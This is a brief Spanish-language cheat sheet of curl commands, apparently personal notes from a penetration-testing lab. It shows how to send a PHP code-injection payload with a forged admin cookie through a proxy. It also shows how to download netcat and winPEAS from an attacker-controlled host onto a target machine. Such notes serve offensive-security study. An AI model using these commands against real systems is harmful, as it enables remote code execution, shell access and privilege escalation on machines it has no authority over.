** Petición a un recurso web **
`curl -s -X GET http://10.10.10.228/portal/php/admins.php`
-s silent
-X http.method

** Incluir los parámetros en la petición **
Cuando tenemos una petición web en la que se deben insertar parámetros en la dirección de la petición, podemos hacerlo de la siguiente forma:
`curl -s -X GET $main_url --data-urlencode "html=<?php system(\"whoami\"); ?>" --cookie "adminpowa=noonecares" --proxy http://127.0.0.1:8080`
Esta forma anteriormente vista enviará los datos como data dentro de la petición, no directamente como parámetros en la dirección de envío. Para incluirlos utilizaremos la opción -G. Además ya no hará falta incluir el parámetro -X de curl:
`curl -s -G $main_url --data-urlencode "html=<?php system(\"whoami\"); ?>" --cookie "adminpowa=noonecares" --proxy http://127.0.0.1:8080`

** Transferir recursos a máquina objetivo para obtener binarios sensibles **
`curl http://10.10.14.8/nc.exe -o nc.exe`
`curl http://10.10.14.8/winPEAS.exe -o winPEAS.exe`

